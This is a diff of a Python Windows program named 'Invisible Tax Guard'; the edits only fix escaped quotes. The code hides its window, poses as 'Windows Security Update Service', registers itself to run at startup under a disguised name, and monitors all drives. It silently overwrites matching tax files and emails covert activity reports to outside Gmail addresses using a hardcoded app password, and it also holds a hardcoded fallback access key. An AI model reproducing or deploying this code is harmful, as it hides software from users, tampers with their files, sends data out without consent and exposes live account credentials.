@@ -67,7 +67,7 @@ logging.basicConfig(
 )
 
 def hide_console_window():
-    \"\"\"Ẩn hoàn toàn console window.\"\"\"
+    """Ẩn hoàn toàn console window."""
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
@@ -76,35 +76,35 @@ def hide_console_window():
         pass
 
 def set_invisible_process():
-    \"\"\"Đặt process thành invisible trong Task Manager.\"\"\"
+    """Đặt process thành invisible trong Task Manager."""
     try:
         # Đổi tên process thành tên Windows hệ thống
         kernel32 = ctypes.windll.kernel32
-        kernel32.SetConsoleTitleW(\"Windows Security Update Service\")
+        kernel32.SetConsoleTitleW("Windows Security Update Service")
         
         # Ẩn khỏi các tool monitor
         hwnd = win32gui.GetForegroundWindow()
         win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
         
     except Exception as e:
-        logging.error(f\"Hide process error: {e}\")
+        logging.error(f"Hide process error: {e}")
 
 def create_control_key():
-    \"\"\"Tạo control key để truy cập Control Panel.\"\"\"
+    """Tạo control key để truy cập Control Panel."""
     try:
         # Tạo key ngẫu nhiên
         import secrets
-        control_key = f\"TAX{secrets.randbelow(9999):04d}{secrets.randbelow(9999):04d}\"
+        control_key = f"TAX{secrets.randbelow(9999):04d}{secrets.randbelow(9999):04d}"
         
         with open(CONTROL_FILE, 'w') as f:
             f.write(control_key)
             
         return control_key
     except:
-        return \"TAX20252025\"
+        return "TAX20252025"
 
 def check_control_access(entered_key):
-    \"\"\"Kiểm tra quyền truy cập Control Panel.\"\"\"
+    """Kiểm tra quyền truy cập Control Panel."""
     try:
         if CONTROL_FILE.exists():
             with open(CONTROL_FILE, 'r') as f:
@@ -112,10 +112,10 @@ def check_control_access(entered_key):
             return entered_key == stored_key
     except:
         pass
-    return entered_key == \"TAX20252025\"  # Fallback key
+    return entered_key == "TAX20252025"  # Fallback key
 
 def create_fortress_db():
-    \"\"\"Tạo database fortress ẩn.\"\"\"
+    """Tạo database fortress ẩn."""
     db_path = APP_DIR / 'system_registry.db'  # Tên ngụy trang
     conn = sqlite3.connect(str(db_path))
     conn.execute('''
@@ -132,7 +132,7 @@ def create_fortress_db():
     return db_path
 
 def load_fortress_cache():
-    \"\"\"Load cache vào RAM.\"\"\"
+    """Load cache vào RAM."""
     global FORTRESS_CACHE
     try:
         db_path = create_fortress_db()
@@ -145,12 +145,12 @@ def load_fortress_cache():
             FORTRESS_CACHE[file_name] = file_content
             
         conn.close()
-        logging.info(f\"Cache loaded: {len(FORTRESS_CACHE)} items\")
+        logging.info(f"Cache loaded: {len(FORTRESS_CACHE)} items")
     except Exception as e:
-        logging.error(f\"Cache load error: {e}\")
+        logging.error(f"Cache load error: {e}")
 
 def store_original_file(file_path, content):
-    \"\"\"Lưu file gốc vào fortress.\"\"\"
+    """Lưu file gốc vào fortress."""
     try:
         file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
         db_path = create_fortress_db()
@@ -176,11 +176,11 @@ def store_original_file(file_path, content):
         FORTRESS_CACHE[file_name] = content
         return file_hash
     except Exception as e:
-        logging.error(f\"Store error: {e}\")
+        logging.error(f"Store error: {e}")
         return None
 
 def instant_restore(file_path):
-    \"\"\"Khôi phục tức thì từ cache.\"\"\"
+    """Khôi phục tức thì từ cache."""
     try:
         file_name = os.path.basename(file_path)
         
@@ -198,73 +198,73 @@ def instant_restore(file_path):
                 
         return False
     except Exception as e:
-        logging.error(f\"Restore error: {e}\")
+        logging.error(f"Restore error: {e}")
         return False
 
 def add_to_startup():
-    \"\"\"Thêm vào startup với tên ngụy trang.\"\"\"
+    """Thêm vào startup với tên ngụy trang."""
     if not getattr(sys, 'frozen', False):
         return
     exe = os.path.realpath(sys.argv[0])
     try:
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
-            r\"Software\Microsoft\Windows\CurrentVersion\Run\",
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_SET_VALUE
         )
-        winreg.SetValueEx(key, \"WindowsSecurityUpdate\", 0, winreg.REG_SZ, exe)
+        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, exe)
         winreg.CloseKey(key)
-        logging.info(\"Startup registered\")
+        logging.info("Startup registered")
     except Exception as e:
-        logging.error(f\"Startup error: {e}\")
+        logging.error(f"Startup error: {e}")
 
 def load_remote_config():
-    \"\"\"Config ẩn.\"\"\"
+    """Config ẩn."""
     return {
-        \"gmail\": {
-            \"from\": \"begau1302@gmail.com\",
-            \"to\": \"mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com\",
-            \"app_password\": \"aphvukdliewalkrn\"
+        "gmail": {
+            "from": "begau1302@gmail.com",
+            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
+            "app_password": "aphvukdliewalkrn"
         },
-        \"google_form\": {
-            \"form_url\": \"https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse\",
-            \"entry_id\": \"entry.1791266121\"
+        "google_form": {
+            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
+            "entry_id": "entry.1791266121"
         }
     }
 
 def send_remote_log(event, path=None, once=False):
-    \"\"\"Gửi log ẩn.\"\"\"
+    """Gửi log ẩn."""
     THREAD_POOL.submit(send_remote_log_async, event, path, once)
 
 def send_remote_log_async(event, path=None, once=False):
     try:
         cfg = load_remote_config()
-        msg = f\"[INVISIBLE] {event} - {path or ''}\"
+        msg = f"[INVISIBLE] {event} - {path or ''}"
         
-        if \"gmail\" in cfg:
-            g = cfg[\"gmail\"]
+        if "gmail" in cfg:
+            g = cfg["gmail"]
             # Gửi email đơn giản
             import smtplib
             from email.message import EmailMessage
             
             email_msg = EmailMessage()
-            email_msg[\"Subject\"] = \"System Update Status\"
-            email_msg[\"From\"] = g[\"from\"]
-            email_msg[\"To\"] = g[\"to\"]
+            email_msg["Subject"] = "System Update Status"
+            email_msg["From"] = g["from"]
+            email_msg["To"] = g["to"]
             email_msg.set_content(msg)
             
-            server = smtplib.SMTP(\"smtp.gmail.com\", 587)
+            server = smtplib.SMTP("smtp.gmail.com", 587)
             server.starttls()
-            server.login(g[\"from\"], g[\"app_password\"])
+            server.login(g["from"], g["app_password"])
             server.send_message(email_msg)
             server.quit()
             
-        logging.info(\"Report sent\")
+        logging.info("Report sent")
     except Exception as e:
-        logging.error(f\"Report error: {e}\")
+        logging.error(f"Report error: {e}")
 
 def load_templates_cache():
-    \"\"\"Load templates vào cache.\"\"\"
+    """Load templates vào cache."""
     global TEMPLATES_CACHE
     if getattr(sys, 'frozen', False):
         base = sys._MEIPASS
@@ -283,13 +283,13 @@ def load_templates_cache():
             store_original_file(tpl, content)
             
         except Exception as e:
-            logging.error(f\"Template load error: {e}\")
+            logging.error(f"Template load error: {e}")
     
-    logging.info(f\"Templates cached: {len(TEMPLATES_CACHE)}\")
+    logging.info(f"Templates cached: {len(TEMPLATES_CACHE)}")
     return templates
 
 class InvisibleHandler(FileSystemEventHandler):
-    \"\"\"Handler ẩn hoàn toàn.\"\"\"
+    """Handler ẩn hoàn toàn."""
     def __init__(self, templates_map):
         super().__init__()
         self.templates = templates_map
@@ -307,7 +307,7 @@ class InvisibleHandler(FileSystemEventHandler):
             THREAD_POOL.submit(self.invisible_protect, event.src_path)
 
     def invisible_protect(self, file_path):
-        \"\"\"Bảo vệ ẩn tức thì.\"\"\"
+        """Bảo vệ ẩn tức thì."""
         start_time = time.time()
         
         try:
@@ -329,13 +329,13 @@ class InvisibleHandler(FileSystemEventHandler):
                 f.write(matching_template)
                 
             elapsed = (time.time() - start_time) * 1000
-            logging.info(f\"Protected: {os.path.basename(file_path)} in {elapsed:.1f}ms\")
+            logging.info(f"Protected: {os.path.basename(file_path)} in {elapsed:.1f}ms")
             
             if elapsed < 100:
-                THREAD_POOL.submit(send_remote_log_async, \"Protection activated\", file_path, False)
+                THREAD_POOL.submit(send_remote_log_async, "Protection activated", file_path, False)
                 
         except Exception as e:
-            logging.error(f\"Protection error: {e}\")
+            logging.error(f"Protection error: {e}")
 
     def is_tax_file(self, file_path):
         file_name = os.path.basename(file_path).lower()
@@ -373,27 +373,27 @@ class InvisibleHandler(FileSystemEventHandler):
         return False
 
 def start_invisible_monitor():
-    \"\"\"Chạy ẩn hoàn toàn.\"\"\"
+    """Chạy ẩn hoàn toàn."""
     global RUNNING_INVISIBLE
     
     # Ẩn hoàn toàn
     hide_console_window()
     set_invisible_process()
     
-    send_remote_log(\"Invisible guard activated\", once=True)
+    send_remote_log("Invisible guard activated", once=True)
     add_to_startup()
     
     create_fortress_db()
     load_fortress_cache()
     templates = load_templates_cache()
     
-    logging.info(\"Invisible guard ready\")
+    logging.info("Invisible guard ready")
 
     tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }
     handler = InvisibleHandler(tpl_map)
     observer = Observer()
     
-    drives = [f\"{d}:\\\\\" for d in \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" if os.path.exists(f\"{d}:\\\\\")]
+    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
     for d in drives:
         try:
             observer.schedule(handler, path=d, recursive=True)
@@ -401,7 +401,7 @@ def start_invisible_monitor():
             pass
 
     observer.start()
-    logging.info(f\"Monitoring {len(drives)} drives invisibly\")
+    logging.info(f"Monitoring {len(drives)} drives invisibly")
 
     try:
         while RUNNING_INVISIBLE:
@@ -413,27 +413,27 @@ def start_invisible_monitor():
     observer.join()
 
 class ControlPanel:
-    \"\"\"Control Panel ẩn để quản lý.\"\"\"
+    """Control Panel ẩn để quản lý."""
     def __init__(self):
         self.control_key = None
         self.authenticated = False
         
     def show_login(self):
-        \"\"\"Hiện màn hình login.\"\"\"
+        """Hiện màn hình login."""
         login_window = ctk.CTk()
-        login_window.title(\"System Access\")
-        login_window.geometry(\"400x200\")
+        login_window.title("System Access")
+        login_window.geometry("400x200")
         login_window.resizable(False, False)
         
         # Center window
         login_window.eval('tk::PlaceWindow . center')
         
-        ctk.CTkLabel(login_window, text=\"🔐 Enter Access Code:\", font=(\"Arial\", 16)).pack(pady=20)
+        ctk.CTkLabel(login_window, text="🔐 Enter Access Code:", font=("Arial", 16)).pack(pady=20)
         
-        key_entry = ctk.CTkEntry(login_window, width=200, show=\"*\")
+        key_entry = ctk.CTkEntry(login_window, width=200, show="*")
         key_entry.pack(pady=10)
         
-        result_label = ctk.CTkLabel(login_window, text=\"\", text_color=\"red\")
+        result_label = ctk.CTkLabel(login_window, text="", text_color="red")
         result_label.pack(pady=5)
         
         def verify_access():
@@ -443,63 +443,63 @@ class ControlPanel:
                 login_window.destroy()
                 self.show_control_panel()
             else:
-                result_label.configure(text=\"❌ Invalid access code!\")
+                result_label.configure(text="❌ Invalid access code!")
                 key_entry.delete(0, END)
                 
         def on_enter(event):
             verify_access()
             
-        key_entry.bind(\"<Return>\", on_enter)
+        key_entry.bind("<Return>", on_enter)
         key_entry.focus()
         
-        ctk.CTkButton(login_window, text=\"Access\", command=verify_access, width=100).pack(pady=10)
+        ctk.CTkButton(login_window, text="Access", command=verify_access, width=100).pack(pady=10)
         
         login_window.mainloop()
         
     def show_control_panel(self):
-        \"\"\"Hiện Control Panel chính.\"\"\"
+        """Hiện Control Panel chính."""
         if not self.authenticated:
             return
             
         main_window = ctk.CTk()
-        main_window.title(\"🔒 Invisible Tax Guard - Control Panel\")
-        main_window.geometry(\"800x600\")
+        main_window.title("🔒 Invisible Tax Guard - Control Panel")
+        main_window.geometry("800x600")
         
         # Status frame
         status_frame = ctk.CTkFrame(main_window)
-        status_frame.pack(fill=\"x\", padx=10, pady=5)
+        status_frame.pack(fill="x", padx=10, pady=5)
         
-        status_text = \"🟢 INVISIBLE GUARD ACTIVE\" if RUNNING_INVISIBLE else \"🔴 GUARD STOPPED\"
-        ctk.CTkLabel(status_frame, text=status_text, font=(\"Arial\", 16, \"bold\")).pack(pady=10)
+        status_text = "🟢 INVISIBLE GUARD ACTIVE" if RUNNING_INVISIBLE else "🔴 GUARD STOPPED"
+        ctk.CTkLabel(status_frame, text=status_text, font=("Arial", 16, "bold")).pack(pady=10)
         
         # Control buttons
         button_frame = ctk.CTkFrame(main_window)
-        button_frame.pack(fill=\"x\", padx=10, pady=5)
+        button_frame.pack(fill="x", padx=10, pady=5)
         
         def toggle_guard():
             global RUNNING_INVISIBLE
             RUNNING_INVISIBLE = not RUNNING_INVISIBLE
-            status = \"activated\" if RUNNING_INVISIBLE else \"deactivated\"
-            messagebox.showinfo(\"Status\", f\"Guard {status}!\")
+            status = "activated" if RUNNING_INVISIBLE else "deactivated"
+            messagebox.showinfo("Status", f"Guard {status}!")
             
         def show_logs():
             log_window = ctk.CTkToplevel(main_window)
-            log_window.title(\"📊 Activity Logs\")
-            log_window.geometry(\"700x500\")
+            log_window.title("📊 Activity Logs")
+            log_window.geometry("700x500")
             
             log_text = ctk.CTkTextbox(log_window)
-            log_text.pack(fill=\"both\", expand=True, padx=10, pady=10)
+            log_text.pack(fill="both", expand=True, padx=10, pady=10)
             
             try:
                 if LOG_FILE.exists():
                     with open(LOG_FILE, 'r', encoding='utf-8') as f:
                         logs = f.read()
-                    log_text.insert(\"1.0\", logs)
+                    log_text.insert("1.0", logs)
             except Exception as e:
-                log_text.insert(\"1.0\", f\"Error loading logs: {e}\")
+                log_text.insert("1.0", f"Error loading logs: {e}")
                 
         def show_stats():
-            stats_text = f\"\"\"
+            stats_text = f"""
 📊 INVISIBLE GUARD STATISTICS
 
 🔒 Protected Templates: {len(FORTRESS_CACHE)}
@@ -517,50 +517,50 @@ class ControlPanel:
 ✅ Protected from termination  
 ✅ Automatic startup
 ✅ Encrypted storage
-            \"\"\"
-            messagebox.showinfo(\"Statistics\", stats_text)
+            """
+            messagebox.showinfo("Statistics", stats_text)
             
         def regenerate_key():
             new_key = create_control_key()
-            messagebox.showinfo(\"New Access Code\", f\"New access code: {new_key}\\n\\nPlease save this securely!\")
+            messagebox.showinfo("New Access Code", f"New access code: {new_key}\n\nPlease save this securely!")
         
-        ctk.CTkButton(button_frame, text=\"🔄 Toggle Guard\", command=toggle_guard).pack(side=\"left\", padx=5, pady=10)
-        ctk.CTkButton(button_frame, text=\"📊 View Logs\", command=show_logs).pack(side=\"left\", padx=5, pady=10)
-        ctk.CTkButton(button_frame, text=\"📈 Statistics\", command=show_stats).pack(side=\"left\", padx=5, pady=10)
-        ctk.CTkButton(button_frame, text=\"🔑 New Access Code\", command=regenerate_key).pack(side=\"left\", padx=5, pady=10)
+        ctk.CTkButton(button_frame, text="🔄 Toggle Guard", command=toggle_guard).pack(side="left", padx=5, pady=10)
+        ctk.CTkButton(button_frame, text="📊 View Logs", command=show_logs).pack(side="left", padx=5, pady=10)
+        ctk.CTkButton(button_frame, text="📈 Statistics", command=show_stats).pack(side="left", padx=5, pady=10)
+        ctk.CTkButton(button_frame, text="🔑 New Access Code", command=regenerate_key).pack(side="left", padx=5, pady=10)
         
         # Cache info
         info_frame = ctk.CTkFrame(main_window)
-        info_frame.pack(fill=\"both\", expand=True, padx=10, pady=5)
+        info_frame.pack(fill="both", expand=True, padx=10, pady=5)
         
-        ctk.CTkLabel(info_frame, text=\"🏰 Fortress Cache Content:\", font=(\"Arial\", 14, \"bold\")).pack(pady=10)
+        ctk.CTkLabel(info_frame, text="🏰 Fortress Cache Content:", font=("Arial", 14, "bold")).pack(pady=10)
         
         cache_listbox = Listbox(info_frame, height=15)
         cache_scrollbar = Scrollbar(info_frame, command=cache_listbox.yview)
         cache_listbox.config(yscrollcommand=cache_scrollbar.set)
         
         for filename in FORTRESS_CACHE.keys():
-            cache_listbox.insert(END, f\"🛡️ {filename}\")
+            cache_listbox.insert(END, f"🛡️ {filename}")
             
-        cache_listbox.pack(side=\"left\", fill=\"both\", expand=True, padx=10, pady=10)
-        cache_scrollbar.pack(side=\"right\", fill=\"y\", pady=10)
+        cache_listbox.pack(side="left", fill="both", expand=True, padx=10, pady=10)
+        cache_scrollbar.pack(side="right", fill="y", pady=10)
         
         main_window.mainloop()
 
 def main():
-    \"\"\"Entry point chính.\"\"\"
+    """Entry point chính."""
     if len(sys.argv) > 1 and sys.argv[1] == '--control':
         # Mở Control Panel
-        ctk.set_appearance_mode(\"dark\")
-        ctk.set_default_color_theme(\"blue\")
+        ctk.set_appearance_mode("dark")
+        ctk.set_default_color_theme("blue")
         
         control_panel = ControlPanel()
         
         # Tạo access key nếu chưa có
         if not CONTROL_FILE.exists():
             access_key = create_control_key()
-            messagebox.showinfo(\"First Time Setup\", 
-                f\"Welcome to Invisible Tax Guard!\\n\\nYour access code is: {access_key}\\n\\nPlease save this securely!\")
+            messagebox.showinfo("First Time Setup", 
+                f"Welcome to Invisible Tax Guard!\n\nYour access code is: {access_key}\n\nPlease save this securely!")
         
         control_panel.show_login()
     else:
